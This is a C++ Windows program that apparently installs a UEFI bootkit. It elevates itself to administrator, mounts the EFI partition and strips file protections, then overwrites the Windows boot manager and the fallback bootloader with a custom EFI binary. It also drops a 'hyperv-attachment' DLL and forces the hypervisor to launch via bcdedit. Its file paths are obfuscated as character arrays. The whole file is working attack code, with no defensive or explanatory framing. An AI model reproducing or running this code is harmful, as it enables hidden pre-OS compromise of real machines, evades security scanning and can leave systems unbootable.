#include <windows.h>
#include <iostream>
#include <string>

bool is_admin() {
    BOOL admin = FALSE;
    PSID admin_group;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_group)) {
        CheckTokenMembership(NULL, admin_group, &admin);
        FreeSid(admin_group);
    }
    return admin == TRUE;
}

void run_as_admin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOWNORMAL);
}

bool aggressive_copy(const std::string& src, const std::string& dst) {
    system(("attrib -s -h -r " + dst + " >nul 2>&1").c_str());
    DeleteFileA(dst.c_str());
    if (CopyFileA(src.c_str(), dst.c_str(), FALSE)) {
        std::cout << "[+] SUCCESS: Updated " << dst << std::endl;
        return true;
    }
    return false;
}

int main() {
    if (!is_admin()) {
        run_as_admin();
        return 0;
    }

    // Silent banner

    system("mountvol Z: /S >nul 2>&1");
    Sleep(500);

    char current_dir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, current_dir);
    std::string bin_path(current_dir);
    
    char s_uefi[] = { '\\', 'u', 'e', 'f', 'i', '-', 'b', 'o', 'o', 't', '.', 'e', 'f', 'i', 0 };
    char s_dll[] = { '\\', 'h', 'y', 'p', 'e', 'r', 'v', '-', 'a', 't', 't', 'a', 'c', 'h', 'm', 'e', 'n', 't', '.', 'd', 'l', 'l', 0 };
    
    std::string src_efi = bin_path + s_uefi;
    std::string src_dll = bin_path + s_dll;

    char s_ms_boot[] = { 'Z',':','\\','E','F','I','\\','M','i','c','r','o','s','o','f','t','\\','B','o','o','t','\\','b','o','o','t','m','g','f','w','.','e','f','i', 0 };
    char s_ms_orig[] = { 'Z',':','\\','E','F','I','\\','M','i','c','r','o','s','o','f','t','\\','B','o','o','t','\\','b','o','o','t','m','g','f','w','.','o','r','i','g','i','n','a','l','.','e','f','i', 0 };
    
    std::string ms_boot = s_ms_boot;
    std::string ms_orig = s_ms_orig;
    
    char s_fb_boot[] = { 'Z',':','\\','E','F','I','\\','B','o','o','t','\\','b','o','o','t','x','6','4','.','e','f','i', 0 };
    char s_fb_orig[] = { 'Z',':','\\','E','F','I','\\','B','o','o','t','\\','b','o','o','t','x','6','4','.','o','r','i','g','i','n','a','l','.','e','f','i', 0 };

    std::string fb_boot = s_fb_boot;
    std::string fb_orig = s_fb_orig;

    // Backup and overwrite Path 1
    if (GetFileAttributesA(ms_orig.c_str()) == INVALID_FILE_ATTRIBUTES) {
        system(("attrib -s -h -r " + ms_boot + " >nul 2>&1").c_str());
        MoveFileA(ms_boot.c_str(), ms_orig.c_str());
    }
    aggressive_copy(src_efi, ms_boot);
    
    char s_ms_dll[] = { 'Z',':','\\','E','F','I','\\','M','i','c','r','o','s','o','f','t','\\','B','o','o','t','\\','h','y','p','e','r','v','-','a','t','t','a','c','h','m','e','n','t','.','d','l','l', 0 };
    aggressive_copy(src_dll, s_ms_dll);

    // Backup and overwrite Path 2
    if (GetFileAttributesA(fb_boot.c_str()) != INVALID_FILE_ATTRIBUTES) {
        if (GetFileAttributesA(fb_orig.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::cout << "[*] Backing up..." << std::endl;
            system(("attrib -s -h -r " + fb_boot + " >nul 2>&1").c_str());
            MoveFileA(fb_boot.c_str(), fb_orig.c_str());
        }
        aggressive_copy(src_efi, fb_boot);
    } else {
        std::cout << "[*] Creating fb..." << std::endl;
        char s_fb_dir[] = { 'Z',':','\\','E','F','I','\\','B','o','o','t', 0 };
        CreateDirectoryA(s_fb_dir, NULL);
        aggressive_copy(src_efi, fb_boot);
    }

    system("bcdedit /set hypervisorlaunchtype auto >nul 2>&1");
    std::cout << "\n[OK] BOOT UPDATED" << std::endl;
    std::cout << "[!] RESTART NOW" << std::endl;

    system("pause");
    return 0;
}
